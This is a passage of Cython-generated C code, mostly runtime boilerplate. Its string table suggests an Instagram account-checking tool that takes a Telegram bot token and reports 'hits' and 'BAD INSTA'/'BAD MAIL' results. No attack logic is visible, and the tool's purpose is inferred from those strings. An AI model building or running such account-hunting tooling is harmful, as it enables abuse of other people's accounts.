    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* PyUnicodeContains.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_ContainsTF(PyObject* substring, PyObject* text, int eq) {
    int result = PyUnicode_Contains(text, substring);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* SetNameInClass.proto */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif

/* CalculateMetaclass.proto */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);

/* Py3ClassCreate.proto */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* CoroutineBase.proto */
typedef PyObject *(*__pyx_coroutine_body_t)(PyObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);

/* PatchModuleWithCoroutine.proto */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);

/* PatchGeneratorABC.proto */
static int __Pyx_patch_abc(void);

/* Generator.proto */
#define __Pyx_Generator_USED
static PyTypeObject *__pyx_GeneratorType = 0;
#define __Pyx_Generator_CheckExact(obj) (Py_TYPE(obj) == __pyx_GeneratorType)
#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_GeneratorType, body, code, closure, name, qualname, module_name)
static PyObject *__Pyx_Generator_Next(PyObject *self);
static int __pyx_Generator_init(void);

/* CStringEquals.proto */
static CYTHON_INLINE int __Pyx_StrEq(const char *, const char *);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct__genexpr = 0;
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct_1_genexpr = 0;
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct_2_genexpr = 0;
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_ImportError;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_BaseException;
static PyObject *__pyx_builtin_range;
static PyObject *__pyx_builtin_open;
static const char __pyx_k_[] = "\n";
static const char __pyx_k_0[] = "0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_E[] = "E";
static const char __pyx_k_F[] = "F";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_H[] = "H";
static const char __pyx_k_I[] = "I";
static const char __pyx_k_J[] = "J";
static const char __pyx_k_L[] = "L";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_N[] = "N";
static const char __pyx_k_O[] = "O";
static const char __pyx_k_P[] = "P";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_Z[] = "Z";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_k[] = "k";
static const char __pyx_k_m[] = "-m";
static const char __pyx_k_o[] = "o";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_s[] = "\n   \342\236\245 \312\231\341\264\217\341\264\233 \341\264\234s\341\264\207\312\200\311\264\341\264\200\341\264\215\341\264\207 : @";
static const char __pyx_k_w[] = "w";
static const char __pyx_k_z[] = "z";
static const char __pyx_k_0m[] = "\033[0m";
static const char __pyx_k_B6[] = "B6";
static const char __pyx_k_Bl[] = "Bl";
static const char __pyx_k_G6[] = "G6";
static const char __pyx_k_HH[] = "HH";
static const char __pyx_k_ID[] = "ID";
static const char __pyx_k_Id[] = "Id";
static const char __pyx_k_L6[] = "L6";
static const char __pyx_k_O6[] = "O6";
static const char __pyx_k_P6[] = "P6";
static const char __pyx_k_TL[] = "TL";
static const char __pyx_k_W6[] = "W6";
static const char __pyx_k_Y6[] = "Y6";
static const char __pyx_k_Z1[] = "Z1";
static const char __pyx_k__2[] = "|";
static const char __pyx_k__3[] = "/";
static const char __pyx_k__4[] = "-";
static const char __pyx_k__5[] = "\\";
static const char __pyx_k__6[] = "\r\312\237\341\264\217\341\264\200\341\264\205\311\252\311\264\311\242 ";
static const char __pyx_k__7[] = "\r\312\237\341\264\217\341\264\200\341\264\205\311\252\311\264\311\242 \341\264\204\341\264\217\341\264\215\341\264\230\312\237\341\264\207\341\264\233\341\264\207\341\264\205    \n";
static const char __pyx_k__8[] = "  \360\237\237\242 \312\231\341\264\217\341\264\233 \322\223\341\264\217\341\264\234\311\264\341\264\205";
static const char __pyx_k__9[] = "\n   \342\236\246 \312\231\341\264\217\341\264\233 \311\264\341\264\200\341\264\215\341\264\207 : ";
static const char __pyx_k_aa[] = "aa";
static const char __pyx_k_an[] = "an";
static const char __pyx_k_cc[] = "cc";
static const char __pyx_k_ff[] = "ff";
static const char __pyx_k_gg[] = "gg";
static const char __pyx_k_hy[] = "hy";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_n1[] = "n1";
static const char __pyx_k_n2[] = "n2";
static const char __pyx_k_ok[] = "ok";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_pk[] = "pk";
static const char __pyx_k_pp[] = "pp";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_rr[] = "rr";
static const char __pyx_k_s6[] = "s6";
static const char __pyx_k_tl[] = "tl";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_yy[] = "yy";
static const char __pyx_k_0_2[] = "?0";
static const char __pyx_k_356[] = "356";
static const char __pyx_k_DEM[] = "DEM";
static const char __pyx_k_DP6[] = "DP6";
static const char __pyx_k_DY6[] = "DY6";
static const char __pyx_k__11[] = " \n";
static const char __pyx_k__14[] = "\n  \342\236\246 \312\217\341\264\217\341\264\234\312\200 \311\264\341\264\200\341\264\215\341\264\207 : ";
static const char __pyx_k__17[] = " ";
static const char __pyx_k__21[] = "";
static const char __pyx_k__22[] = "*/*";
static const char __pyx_k__24[] = "[\"";
static const char __pyx_k__25[] = "\",\"";
static const char __pyx_k__27[] = "\"";
static const char __pyx_k__29[] = "//";
static const char __pyx_k__31[] = "@";
static const char __pyx_k__37[] = "\"}";
static const char __pyx_k__52[] = "\360\235\227\246\360\235\227\224\360\235\227\247\360\235\227\224\360\235\227\241 \360\235\227\246\360\235\227\230\360\235\227\241\360\235\227\227 \360\235\227\224 \360\235\227\233\360\235\227\234\360\235\227\247\n\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\n\n\360\235\227\233\360\235\227\234\360\235\227\247 : ";
static const char __pyx_k__56[] = "\342\200\242";
static const char __pyx_k__57[] = "\342\200\242\n\n\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\342\253\230\n\n\n";
static const char __pyx_k__58[] = " \360\223\201\274 ";
static const char __pyx_k__59[] = "\360\235\227\233\360\235\227\234\360\235\227\247 ";
static const char __pyx_k__60[] = "  - ";
static const char __pyx_k__61[] = "\360\235\227\225\360\235\227\224\360\235\227\227 \360\235\227\234\360\235\227\241\360\235\227\246\360\235\227\247\360\235\227\224 - ";
static const char __pyx_k__62[] = "\360\235\227\225\360\235\227\224\360\235\227\227 \360\235\227\240\360\235\227\224\360\235\227\234\360\235\227\237 - ";
static const char __pyx_k__63[] = "           ";
static const char __pyx_k__64[] = "*";
static const char __pyx_k__69[] = "\360\237\225\233";
static const char __pyx_k__70[] = "\360\237\225\220";
static const char __pyx_k__71[] = "\360\237\225\221";
static const char __pyx_k__72[] = "\360\237\225\222";
static const char __pyx_k__73[] = "\360\237\225\223";
static const char __pyx_k__74[] = "\360\237\225\224";
static const char __pyx_k__75[] = "\360\237\225\225";
static const char __pyx_k__76[] = "\360\237\225\226";
static const char __pyx_k__77[] = "\360\237\225\227";
static const char __pyx_k__78[] = "\360\237\225\230";
static const char __pyx_k__79[] = "\360\237\225\231";
static const char __pyx_k__80[] = "\360\237\225\232";
static const char __pyx_k__81[] = "\n\n";
static const char __pyx_k__82[] = "[ ";
static const char __pyx_k__83[] = " ]";
static const char __pyx_k__84[] = "\n\n ";
static const char __pyx_k__87[] = "\037";
static const char __pyx_k__93[] = "\n\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\342\227\207\342\224\200\n";
static const char __pyx_k__94[] = "_";
static const char __pyx_k_aca[] = "aca";
static const char __pyx_k_an2[] = "an2";
static const char __pyx_k_dev[] = "dev";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_ggb[] = "ggb";
static const char __pyx_k_he3[] = "he3";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_m_2[] = "m";
static const char __pyx_k_md5[] = "md5";
static const char __pyx_k_now[] = "now";
static const char __pyx_k_pip[] = "pip";
static const char __pyx_k_red[] = "red";
static const char __pyx_k_res[] = "res";
static const char __pyx_k_ror[] = "ror";
static const char __pyx_k_rrr[] = "rrr";
static const char __pyx_k_s_2[] = "\360\237\237\242 \341\264\234s\341\264\207\312\200 \322\223\341\264\217\341\264\234\311\264\341\264\205 ";
static const char __pyx_k_s_3[] = "  \342\236\245 \312\217\341\264\217\341\264\234\312\200 \341\264\234s\341\264\207\312\200\311\264\341\264\200\341\264\215\341\264\207 : @";
static const char __pyx_k_s_4[] = "\n\322\223\341\264\207\341\264\233\341\264\204\312\234\311\252\311\264\311\242 \312\231\341\264\217\341\264\233 \311\252\311\264\322\223\341\264\217... \341\264\230\312\237\341\264\207\341\264\200s\341\264\207 \341\264\241\341\264\200\311\252\341\264\233.";
static const char __pyx_k_s_s[] = "  \360\237\224\264  \341\264\207\312\200\312\200\341\264\217\312\200 : \312\231\341\264\217\341\264\233 \341\264\233\341\264\217\341\264\213\341\264\207\311\264 \341\264\241\341\264\200s \341\264\241\312\200\341\264\217\311\264\311\242 [ \341\264\230\312\237\341\264\207\341\264\200s\341\264\207 \341\264\204\312\234\341\264\207\341\264\204\341\264\213 \312\217\341\264\217\341\264\234\312\200 \312\231\341\264\217\341\264\233 \341\264\233\341\264\217\341\264\213\341\264\207\311\264 ]";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_tlg[] = "tlg";
static const char __pyx_k_tll[] = "tll";
static const char __pyx_k_tok[] = "tok";
static const char __pyx_k_txt[] = ".txt";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_uui[] = "uui";
static const char __pyx_k_38_5[] = "\033[38;5;";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_None[] = "None";
static const char __pyx_k_WIFI[] = "WIFI";
static const char __pyx_k__106[] = "\n\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\240\217\342\243\241\342\240\264\342\240\246\342\243\214\342\241\271\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\242\203\342\241\274\342\240\201\342\240\200\342\240\200\342\240\210\342\242\263\342\241\210\342\242\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\277\342\242\201\342\241\236\342\240\201\342\240\200\342\243\274\342\243\247\342\241\200\342\240\210\342\242\263\342\241\214\342\242\273\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243""\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\n\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\243\277\342\241\237\342\242\241\342\241\236\342\240\200\342\242\200\342\243\274\342\243\277\342\243\277\342\243\267\342\241\200\342\240\200\342\240\271\342\241\204\342\242\273\342\243\277